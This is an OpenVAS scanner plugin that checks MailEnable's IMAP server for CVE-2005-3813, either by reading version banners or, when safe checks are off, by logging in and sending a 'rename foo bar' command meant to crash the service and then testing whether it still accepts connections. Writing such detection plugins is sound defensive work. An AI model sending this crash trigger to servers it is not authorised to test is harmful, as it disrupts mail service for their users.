# OpenVAS Vulnerability Test
# $Id: mailenable_imap_rename_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MailEnable IMAP rename DoS Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote IMAP server is prone to denial of service attacks. 

Description :

The remote host is running MailEnable, a commercial mail server for
Windows. 

The IMAP server bundled with the version of MailEnable Professional or
Enterprise Edition installed on the remote host is prone to crash due
to incorrect handling of mailbox names in the rename command.  An
authenticated remote attacker can exploit this flaw to crash the IMAP
server on the remote host.";

tag_solution = "Apply the IMAP Cumulative Hotfix/Update provided in the zip file
referenced above.";

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.20245");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
 script_tag(name:"qod_type", value:"remote_banner_unreliable");

  script_cve_id("CVE-2005-3813");
  script_bugtraq_id(15556);
  script_xref(name:"OSVDB", value:"21109");

  name = "MailEnable IMAP rename DoS Vulnerability";
  script_name(name);
 
 
  summary = "Checks for rename DoS vulnerability in MailEnable's IMAP service";
 
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");

  script_copyright("This script is Copyright (C) 2005 Josh Zlatin-Amishav");

  script_dependencies("find_service.nasl");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/417589");
  script_xref(name : "URL" , value : "http://www.mailenable.com/hotfix/MEIMAPS.ZIP");
  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");

user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(
      pattern:"Version: (0-+)?([0-9][^- ]+)-*",
      string:banner,
      icase:TRUE
    );
    if (ver == NULL) {
      if (log_verbosity > 1) debug_print("can't determine version of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      if (log_verbosity > 1) debug_print("can't determine edition of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    ver = ver[2];

    if (
      # nb: Professional versions <= 1.7 may be vulnerable.
      (edition == "Professional" && ver =~ "^1\.([0-6]|7$)") ||
      # nb: Enterprise versions <= 1.1 may be vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.(0|1$)")
    ) {
      report = string(
        "***** OpenVAS has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of Mailenable\n",
        "***** installed there. Since the Hotfix does not change the version\n",
        "***** number, though, this might be a false positive.\n",
        "\n"
      );
      security_message(port:port, data:report);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s) || "IMAP4rev1 server ready at" >!< s )
  {
    close(soc);
    exit(0);
  }

  # Try to log in.
  ++tag;
  resp = NULL;
  c = string("openvas", string(tag), " LOGIN ", user, " ", pass);
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^openvas", string(tag), " (OK|BAD|NO)"), string:s
  , icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }


  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    ++tag;
    payload = string("openvas", string(tag), " rename foo bar");
    send(socket:soc, data:string(payload, "\r\n"));
    # It may take some time for the remote connection to close
    # and refuse new connections
    sleep(5);
    # Try to reestablish a connection
    soc2 = open_sock_tcp(port);

    # There's a problem if we can't establish the connection 

    if (!soc2) {
      security_message(port);
      exit(0);
    }
    close(soc2);
  }
}
